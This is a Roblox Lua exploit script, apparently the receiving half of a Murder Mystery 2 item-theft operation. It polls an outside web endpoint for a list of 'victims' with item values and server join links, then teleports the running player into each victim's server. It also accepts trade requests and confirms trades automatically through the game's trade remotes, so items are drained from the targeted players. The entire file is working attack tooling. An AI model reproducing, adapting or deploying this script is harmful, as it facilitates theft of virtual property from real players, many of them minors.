_G.autoJoinerExecuted = _G.autoJoinerExecuted or false
if _G.autoJoinerExecuted then
    return
end
_G.autoJoinerExecuted = true

local HttpService = game:GetService('HttpService')
local TeleportService = game:GetService('TeleportService')
local Players = game:GetService('Players')
local TweenService = game:GetService('TweenService')
local UserInputService = game:GetService('UserInputService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild('PlayerGui')

local API_ENDPOINT = 'https://404cheetos.a05348299.workers.dev/api/heartbeat/status'
local POLL_INTERVAL = 0.2
local MM2_PLACE_ID = 142823291

local guiElements = {}
local http_get_func
local lastOfferValue = 0

if syn and type(syn.request) == "function" then
    http_get_func = function(url) return syn.request({Url = url, Method = "GET"}).Body end
elseif type(request) == "function" then
    http_get_func = function(url) return request({Url = url, Method = "GET"}).Body end
elseif type(http_request) == "function" then
    http_get_func = function(url) return http_request({Url = url, Method = "GET"}).Body end
elseif type(HttpGet) == "function" then
    http_get_func = HttpGet
else
    http_get_func = function(url) return HttpService:GetAsync(url) end
end

local function updateTitle(count, tempMessage)
    if not guiElements.TitleLabel then return end

    if tempMessage then
        guiElements.TitleLabel.Text = "ðŸŽƒ " .. tempMessage
    else
        guiElements.TitleLabel.Text = "ðŸŽƒ MM2 Auto-Joiner | Hits: " .. tostring(count)
    end
end

local function createUI()
    if playerGui:FindFirstChild('AutoJoinerUI') then
        playerGui.AutoJoinerUI:Destroy()
    end

    local screenGui = Instance.new('ScreenGui')
    screenGui.Name = 'AutoJoinerUI'
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.ResetOnSpawn = false

    local mainFrame = Instance.new('Frame')
    mainFrame.Name = 'MainFrame'
    mainFrame.Parent = screenGui
    mainFrame.Size = UDim2.new(0, 320, 0, 260)
    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -130)
    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 0, 15)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.BorderSizePixel = 2
    mainFrame.BorderColor3 = Color3.fromRGB(255, 120, 0)
    Instance.new('UICorner', mainFrame).CornerRadius = UDim.new(0, 12)
    guiElements.MainFrame = mainFrame

    local gradient = Instance.new('UIGradient', mainFrame)
    gradient.Rotation = 90
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 0, 50)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(150, 0, 60)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 140, 0)),
    })

    local titleBar = Instance.new('Frame', mainFrame)
    titleBar.Size = UDim2.new(1, 0, 0, 42)
    titleBar.BackgroundTransparency = 1
    guiElements.TitleBar = titleBar

    local title = Instance.new('TextLabel', titleBar)
    title.Size = UDim2.new(1, -50, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = 'ðŸŽƒ MM2 Auto-Joiner'
    title.TextColor3 = Color3.fromRGB(255, 180, 50)
    title.Font = Enum.Font.FredokaOne
    title.TextSize = 20
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 0.3
    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    guiElements.TitleLabel = title

    local closeBtn = Instance.new('TextButton', titleBar)
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0.5, -15)
    closeBtn.Text = '[-]'
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 16
    Instance.new('UICorner', closeBtn)
    guiElements.ToggleButton = closeBtn

    local contentBg = Instance.new('Frame', mainFrame)
    contentBg.Size = UDim2.new(0.92, 0, 1, -52)
    contentBg.Position = UDim2.new(0.04, 0, 0, 42)
    contentBg.BackgroundColor3 = Color3.fromRGB(20, 0, 20)
    contentBg.BackgroundTransparency = 0.4
    Instance.new('UICorner', contentBg)
    guiElements.ContentBg = contentBg

    local scrollingFrame = Instance.new('ScrollingFrame', contentBg)
    scrollingFrame.Name = 'VictimList'
    scrollingFrame.Size = UDim2.new(1, -10, 1, -10)
    scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
    scrollingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    scrollingFrame.BackgroundTransparency = 1
    scrollingFrame.BorderSizePixel = 0
    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 120, 0)
    scrollingFrame.ScrollBarThickness = 5
    guiElements.ScrollingFrame = scrollingFrame

    local listLayout = Instance.new('UIListLayout', scrollingFrame)
    listLayout.Name = "Layout"
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Padding = UDim.new(0, 5)

    local victimTemplate = Instance.new('Frame')
    victimTemplate.Name = 'VictimTemplate'
    victimTemplate.Parent = scrollingFrame
    victimTemplate.Visible = false
    victimTemplate.BackgroundColor3 = Color3.fromRGB(45, 20, 45)
    victimTemplate.Size = UDim2.new(1, 0, 0, 60)
    Instance.new('UICorner', victimTemplate).CornerRadius = UDim.new(0, 6)
    guiElements.VictimTemplate = victimTemplate

    local victimName = Instance.new('TextLabel', victimTemplate)
    victimName.Name = 'VictimName'
    victimName.BackgroundTransparency = 1
    victimName.Position = UDim2.new(0.05, 0, 0.05, 0)
    victimName.Size = UDim2.new(0.6, 0, 0.3, 0)
    victimName.Font = Enum.Font.GothamBold
    victimName.TextColor3 = Color3.fromRGB(255, 255, 255)
    victimName.Text = 'VictimUsername'
    victimName.TextXAlignment = Enum.TextXAlignment.Left
    victimName.TextScaled = true

    local victimValue = Instance.new('TextLabel', victimTemplate)
    victimValue.Name = 'VictimValue'
    victimValue.BackgroundTransparency = 1
    victimValue.Position = UDim2.new(0.05, 0, 0.35, 0)
    victimValue.Size = UDim2.new(0.6, 0, 0.25, 0)
    victimValue.Font = Enum.Font.Gotham
    victimValue.TextColor3 = Color3.fromRGB(0, 255, 127)
    victimValue.Text = 'Value: 0'
    victimValue.TextXAlignment = Enum.TextXAlignment.Left
    victimValue.TextScaled = true

    local timeAlive = Instance.new("TextLabel", victimTemplate)
    timeAlive.Name = "TimeAlive"
    timeAlive.BackgroundTransparency = 1
    timeAlive.Position = UDim2.new(0.05, 0, 0.6, 0)
    timeAlive.Size = UDim2.new(0.6, 0, 0.3, 0)
    timeAlive.Font = Enum.Font.Gotham
    timeAlive.TextColor3 = Color3.fromRGB(200, 200, 200)
    timeAlive.Text = "Active: 0m 0s"
    timeAlive.TextXAlignment = Enum.TextXAlignment.Left
    timeAlive.TextScaled = true
    
    local statusIndicator = Instance.new("Frame", victimTemplate)
    statusIndicator.Name = "StatusIndicator"
    statusIndicator.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    statusIndicator.Position = UDim2.new(1, -20, 0.1, 0)
    statusIndicator.Size = UDim2.new(0, 10, 0, 10)
    Instance.new("UICorner", statusIndicator).CornerRadius = UDim.new(1,0)

    local joinButton = Instance.new('TextButton', victimTemplate)
    joinButton.Name = 'JoinButton'
    joinButton.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
    joinButton.Position = UDim2.new(0.7, 0, 0.5, -15)
    joinButton.Size = UDim2.new(0.25, 0, 0, 30)
    joinButton.Font = Enum.Font.GothamBold
    joinButton.TextColor3 = Color3.new(1, 1, 1)
    joinButton.Text = 'JOIN'
    joinButton.TextScaled = true
    Instance.new('UICorner', joinButton).CornerRadius = UDim.new(0, 4)

    local dragging, dragInput, dragStart, startPos
    local function updateFramePosition(input)
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    titleBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            updateFramePosition(input)
        end
    end)

    closeBtn.MouseButton1Click:Connect(function()
        local isHidden = contentBg.Visible
        contentBg.Visible = not isHidden
        local newSize = isHidden and UDim2.new(0, 320, 0, 260) or UDim2.new(0, 320, 0, 42)
        TweenService:Create(mainFrame, TweenInfo.new(0.3), { Size = newSize }):Play()
        closeBtn.Text = isHidden and '[-]' or '[+]'
    end)
end

local function formatValue(value)
    local formatted = tostring(value)
    while true do
        local k
        formatted, k = string.gsub(formatted, '^(-?%d+)(%d%d%d)', '%1,%2')
        if k == 0 then break end
    end
    return formatted
end

local function updateVictimList(victims)
    if not guiElements.ScrollingFrame then return end
    
    for _, child in ipairs(guiElements.ScrollingFrame:GetChildren()) do
        if child.Name ~= "Layout" and child.Name ~= "VictimTemplate" then
            child:Destroy()
        end
    end

    if #victims == 0 then
        local noVictimsLabel = guiElements.ScrollingFrame:FindFirstChild("NoVictimsLabel")
        if not noVictimsLabel then
            noVictimsLabel = Instance.new('TextLabel')
            noVictimsLabel.Name = "NoVictimsLabel"
            noVictimsLabel.Parent = guiElements.ScrollingFrame
            noVictimsLabel.BackgroundTransparency = 1
            noVictimsLabel.Size = UDim2.new(1, 0, 0, 50)
            noVictimsLabel.Font = Enum.Font.Gotham
            noVictimsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
            noVictimsLabel.Text = 'No victims assigned to you...'
            noVictimsLabel.TextScaled = true
        end
        return
    else
        local noVictimsLabel = guiElements.ScrollingFrame:FindFirstChild("NoVictimsLabel")
        if noVictimsLabel then
            noVictimsLabel:Destroy()
        end
    end

    for _, victim in ipairs(victims) do
        local newEntry = guiElements.VictimTemplate:Clone()
        newEntry.VictimName.Text = victim.username or 'Unknown'
        newEntry.VictimValue.Text = 'Value: ' .. formatValue(victim.value or 0)
        
        local timeAlive = victim.time_alive or 0
        local minutes = math.floor(timeAlive / 60)
        local seconds = math.floor(timeAlive % 60)
        newEntry.TimeAlive.Text = string.format("Active: %dm %ds", minutes, seconds)

        if victim.status == "alive" then
            newEntry.StatusIndicator.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        else
            newEntry.StatusIndicator.BackgroundColor3 = Color3.fromRGB(255, 180, 0)
        end
        
        newEntry.Visible = true
        newEntry.Parent = guiElements.ScrollingFrame

        newEntry.JoinButton.MouseButton1Click:Connect(function()
            local joinLink = victim.join_link
            if joinLink then
                local placeId = joinLink:match('placeId=([%d]+)')
                local jobId = joinLink:match('gameInstanceId=([%w-]+)')
                if placeId and tonumber(placeId) == MM2_PLACE_ID and jobId then
                    updateTitle(0, 'Manually joining ' .. newEntry.VictimName.Text .. '...')
                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, plr)
                else
                    updateTitle(0, 'Cannot join: Invalid link')
                end
            end
        end)
    end
end

local function startAutoJoiner()
    if not http_get_func then
        updateTitle(0, "Error: No HTTP function")
        return
    end

    local myUsername = plr.Name
    local attemptedJoins = {}

    while task.wait(POLL_INTERVAL) do
        local responseBody
        local success, response = pcall(function()
            responseBody = http_get_func(API_ENDPOINT)
        end)

        if not success then
            updateTitle(0, 'Error: Could not contact server')
            warn("HTTP Request failed:", response)
            continue
        end

        local decodeSuccess, data = pcall(function()
            return HttpService:JSONDecode(responseBody)
        end)

        if not decodeSuccess or not data or not data.grouped_victims then
            updateTitle(0, 'Error: Invalid server response')
            warn("JSON Decode failed or missing data:", data)
            continue
        end

        local myVictims = {}
        if data.grouped_victims.MM2 then
            for _, victim in ipairs(data.grouped_victims.MM2) do
                if victim.receiver == myUsername and victim.status == "alive" then
                    table.insert(myVictims, victim)
                end
            end
        end
        
        updateTitle(#myVictims)
        updateVictimList(myVictims)

        if #myVictims > 0 then
            local targetVictim = myVictims[1]
            local joinLink = targetVictim.join_link

            if not joinLink then continue end

            local placeId = joinLink:match('placeId=([%d]+)')
            local jobId = joinLink:match('gameInstanceId=([%w-]+)')

            if not placeId or tonumber(placeId) ~= MM2_PLACE_ID then continue end
            if not jobId then continue end
            if game.JobId == jobId then continue end
            if attemptedJoins[jobId] and (tick() - attemptedJoins[jobId] < 60) then continue end

            updateTitle(#myVictims, "Auto-joining: " .. (targetVictim.username or 'Unknown'))
            
            local tpSuccess, tpError = pcall(function()
                TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, plr)
            end)

            if not tpSuccess then
                updateTitle(#myVictims, 'Teleport failed')
                attemptedJoins[jobId] = tick()
            end
        end
    end
end

ReplicatedStorage.Trade.RequestSent.OnClientEvent:Connect(function()
    pcall(function()
        ReplicatedStorage.Trade.AcceptRequest:FireServer()
    end)
end)

ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
    if tradeData and tradeData.LastOffer then
        lastOfferValue = tradeData.LastOffer
    end
    if tradeData and tradeData.State == "Confirming" then
        pcall(function()
            ReplicatedStorage.Trade.AcceptTrade:FireServer(428469873, lastOfferValue)
        end)
    end
end)

createUI()
startAutoJoiner()
